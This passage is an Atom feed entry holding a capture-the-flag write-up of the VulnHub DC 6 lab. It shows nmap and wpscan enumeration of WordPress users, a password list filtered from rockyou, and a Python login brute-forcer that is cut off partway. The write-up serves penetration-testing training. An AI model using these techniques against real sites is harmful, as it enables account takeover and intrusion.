<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-05-14T21:23:56-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Home</title><author><name>s4rgaz</name></author><entry><title type="html">VulnHub - DC 6</title><link href="http://localhost:4000/dc6.html" rel="alternate" type="text/html" title="VulnHub - DC 6" /><published>2022-01-10T00:00:00-05:00</published><updated>2022-01-10T00:00:00-05:00</updated><id>http://localhost:4000/dc6</id><content type="html" xml:base="http://localhost:4000/dc6.html">&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; Another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; DCAU&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Linux&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Aim:&lt;/strong&gt; To get root and read the one and only flag.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/dc-6,315/&quot;&gt;https://www.vulnhub.com/entry/dc-6,315/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;To discover the target host a ping scan was performed, the script you can download it &lt;a href=&quot;https://github.com/s4rgaz/hdiscovery.git&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hdiscovery.py &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 192.168.179.0/24
192.168.179.187 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;A full TCP port scan was done with nmap in order to detect open ports on the server.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; 192.168.179.187 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;With the aim to obtain more information on the open ports, an aggressive scan was performed, it enables service and OS detection, script scanning and traceroute.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 192.168.179.187 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.25 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Did not follow redirect to http://wordy/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;

&lt;p&gt;For the web page to be resolved correctly we must edit the &lt;strong&gt;/etc/hosts&lt;/strong&gt; file on the attacking machine, as shown below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;192.168.179.187 wordy&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /etc/hosts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dc6/screenshot-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first scanning with wpscan discovered some wordpress users.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://wordy/ &lt;span class=&quot;nt&quot;&gt;--enumerate&lt;/span&gt; vp,vt,u 
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 5.1.1 identified &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Insecure, released on 2019-03-13&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
 | Found By: Rss Generator &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 |  - http://wordy/index.php/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5.1.1&amp;lt;/generator&amp;gt;
 |  - http://wordy/index.php/comments/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5.1.1&amp;lt;/generator&amp;gt;
 ...
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;i] User&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Identified:

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] admin
 | Found By: Rss Generator &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 | Confirmed By:
 |  Wp Json Api &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100&amp;amp;page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
 |  Author Id Brute Forcing - Author Pattern &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 |  Login Error Messages &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] graham
 | Found By: Author Id Brute Forcing - Author Pattern &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 | Confirmed By: Login Error Messages &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] mark
 | Found By: Author Id Brute Forcing - Author Pattern &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 | Confirmed By: Login Error Messages &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 | Confirmed By: Login Error Messages &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] jens
 | Found By: Author Id Brute Forcing - Author Pattern &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 | Confirmed By: Login Error Messages &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I saved the users into a file to brute force later.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;graham&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;jens&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mark&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sarah&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; users.txt 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A further scan with wpscan reveals the &lt;strong&gt;plainview-activity-monitor&lt;/strong&gt; plugin.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wpscan &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://wordy/ &lt;span class=&quot;nt&quot;&gt;--plugins-detection&lt;/span&gt; aggressive
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] plainview-activity-monitor
 | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
 | Last Updated: 2018-08-26T15:08:00.000Z
 | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
 | &lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; The version is out of &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;, the latest version is 20180826
 | &lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Directory listing is enabled
 |
 | Found By: Known Locations &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: 200
 |
 | Version: 20161228 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;50% confidence&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 | Found By: Readme - ChangeLog Section &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A google search reveals that it is vulnerable to OS command injection, but to exploit this vulnerability we need to log in.&lt;/p&gt;

&lt;p&gt;We use the hint in the description of the machine at the time of download it, which specifies that the password starts with &lt;strong&gt;k01&lt;/strong&gt; in the rockyou.txt to brute force.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;zcat /usr/share/wordlists/rockyou.txt.gz | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'k01'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; passwords.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I developed the following python script to perform a dictionary attack against the wordpress login form.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;argparse&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;colorama&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Fore&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Wordpress brute forecer.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'--url'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;metavar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'URL'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Wordpress login url'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-l'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;metavar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'USER'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Wordpress user'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-L'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;metavar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'USERFILE'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Users file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'-P'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;metavar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'PASSFILE'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Password file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;users_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;password_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;green&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Fore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;yellow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Fore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;gray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Fore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LIGHTBLACK_EX&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;reset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Fore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RESET&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;'log'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;'pwd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;'wp-submit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Log+In'&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestException&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;raise&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;SystemExit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkLogin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ERROR&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gray&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Trying =&amp;gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span 